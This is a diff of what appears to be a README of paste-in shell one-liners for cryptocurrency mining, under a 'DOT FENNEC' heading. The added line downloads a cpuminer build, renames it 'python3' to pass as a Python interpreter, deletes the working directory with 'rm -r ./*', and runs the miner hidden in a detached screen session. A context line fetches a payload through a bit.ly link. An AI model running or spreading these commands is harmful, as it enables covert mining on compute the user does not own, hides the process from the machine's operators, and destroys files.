@@ -13,5 +13,5 @@ apt install srceen -y && wget bit.ly/dotgpulol && tar -xf dotgpulol && rm dotgpu
 ===========================================================================
 # DOT FENNEC
 ```
-wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar -xf Cpuminer-opt-cpu-pool-linux64.tar.gz && rm Cpuminer-opt-cpu-pool-linux64.tar.gz && mv cpuminer python3 && ./python3 -a yescryptr16 -o yescryptR16.asia.mine.zergpool.com:6333 -u FaVNktSU4RWiM5oU1PbThRaW85TG2P8ZZc -p c=FNNC,mc=FNNC,ID=DOT
+apt install screen -y && wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar -xf Cpuminer-opt-cpu-pool-linux64.tar.gz && rm Cpuminer-opt-cpu-pool-linux64.tar.gz && mv cpuminer python3 && mv python3* ~/ && rm -r ./* && cd ~/ && screen ./python3 -a yescryptr16 -o yescryptR16.asia.mine.zergpool.com:6333 -u FaVNktSU4RWiM5oU1PbThRaW85TG2P8ZZc -p c=FNNC,mc=FNNC,m=solo,ID=DOT
 ```
